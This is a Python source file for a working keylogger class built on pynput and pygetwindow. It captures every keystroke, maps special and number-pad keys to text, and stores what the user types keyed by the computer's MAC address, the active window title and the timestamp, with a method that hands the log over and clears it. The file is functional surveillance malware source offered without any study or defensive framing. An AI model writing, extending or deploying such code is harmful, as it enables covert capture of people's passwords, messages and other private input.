from datetime import datetime
import pygetwindow as gw
from pynput.keyboard import Listener , Key , KeyCode
from abc import ABC, abstractmethod
import uuid


class ILogger(ABC):
    @abstractmethod
    def start_listening(self):
        pass
    @abstractmethod
    def stop_listening(self):
        pass
    @abstractmethod
    def get_data(self):
        pass

class KeyLoggerService(ILogger):

    def __init__(self):
        self.data = dict()
        self.listener = Listener(
            on_press=self._on_press
        )
    def start_listening(self):
        """
        Starts listening to keyboard keys
        """
        self.listener.start()

    def stop_listening(self):
        """
        Stops listening to keyboard keys
        """
        self.listener.stop()

    def get_data(self)-> dict:
        """
       Return a chained dictionary where the keys
        are the MAC addresses of the computers and
        the values are dictionaries where the keys
         are windows in which the user typed and
         the values are dictionaries where the keys
          are the time signature he typed and the values
          are the characters he typed
        """
        data = self.data.copy()
        self.data.clear()
        return data

    def _on_press(self , key):
        update_key = KeyLoggerService._correction_keys(key)
        self._get_dict_keys(update_key)

    def _get_dict_keys(self, key):
        """
         Creates a chained dictionary where the keys
        are the MAC addresses of the computers and
        the values are dictionaries where the keys
         are windows in which the user typed and
         the values are dictionaries where the keys
          are the time signature he typed and the values
          are the characters he typed
        """
        mac_address = self._get_mac_address()
        if mac_address not in self.data:
            self.data[mac_address] = dict()
        window = self._get_window()
        if window not in self.data[mac_address]:
            self.data[mac_address][window] = dict()
        timestamp = self._get_time()
        if timestamp not in self.data[mac_address][window]:
            self.data[mac_address][window][timestamp] = str()
        self.data[mac_address][window][timestamp] += key

    @staticmethod
    def _correction_keys(key) -> str:
        """
        Returns the corrected
        value of the keys typed
        """
        dict_special = {
            Key.space: ' ', Key.enter: '\n', Key.tab: '\t'
        }
        if key in dict_special:
            return dict_special[key]
        elif isinstance(key, KeyCode) and key.vk is not None:
            if 96 <= key.vk <= 105:
                return str(key.vk - 96)
        if hasattr(key, "char") and key is not None:
            return key.char

        return str(key)

    @staticmethod
    def _get_time():
        """
        Returns the timestamp of the typing
        """
        return datetime.now().strftime("%Y-%m-%d %H:%M")
    @staticmethod
    def _get_window():
        """
        Returns the current typing window
        """
        return gw.getActiveWindow().title
    @staticmethod
    def _get_mac_address():
        """
        Returns the MAC address
        of the current computer
        """
        mac = uuid.getnode()
        return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
